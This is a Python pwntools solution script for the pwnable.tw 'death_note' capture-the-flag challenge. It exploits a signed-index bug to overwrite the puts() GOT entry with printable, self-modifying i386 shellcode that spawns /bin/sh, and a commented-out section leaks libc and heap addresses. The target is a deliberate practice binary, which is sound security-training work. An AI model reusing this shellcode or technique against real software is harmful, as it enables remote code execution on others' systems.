#!/usr/bin/env python3

from pwn import *

exe = ELF("./death_note")
# libc = exe.libc

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10201)

    return r


def add(index: int, name: bytes):
    r.sendlineafter(b":", b"1")
    r.sendlineafter(b":", str(index).encode("ascii"))
    r.sendafter(b":", name)


def show(index: int) -> bytes:
    r.sendlineafter(b":", b"2")
    r.sendlineafter(b":", str(index).encode("ascii"))
    return r.recvline().strip()[7:]


def delete(index: int):
    r.sendlineafter(b":", b"3")
    r.sendlineafter(b":", str(index).encode("ascii"))


def main():
    r = conn()

    # NOTE: Allocation size is determined by out input length through `strdup()`.
    #       Also the program uses a SIGNED integer as index.

    """ This whole section is useless because remote binary has RWX heap!
    # Use pointer to _IO_2_1_stdout_ to leak libc
    libc.address = u32(show(-7)[4:8]) - 0x231d87
    log.info(f"libc @ 0x{libc.address:x}")

    # Place a heap pointer in `exit()` GOT entry
    add(-15, b"AAAA")

    # Use JMPREL Relocation Table to leak heap pointer
    heap = u32(show(-787)[:4]) - 0x1a0
    log.info(f"libc @ 0x{heap:x}")
    
    delete(-15)
    """

    # This shellcode was taken from a writeup
    # eax = 0xb, ebx = "/bin/sh", ecx = edx = 0
    shellcode = """
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        push esp
        pop ebx

        push edx
        pop eax
        push 0x60606060
        pop edx
        sub byte ptr[eax + 0x35] , dl
        sub byte ptr[eax + 0x35] , dl
        sub byte ptr[eax + 0x34] , dl
        push 0x3e3e3e3e
        pop edx
        sub byte ptr[eax + 0x34] , dl

        push ecx
        pop edx

        push edx
        pop eax
        xor al, 0x40
        xor al, 0x4b
        push edx
        pop edx
        push edx
        pop edx
    """

    # -16 --> `puts()` GOT
    add(-16, asm(shellcode) + b'\x6b\x40')

    r.interactive("$ ")

if __name__ == "__main__":
    main()
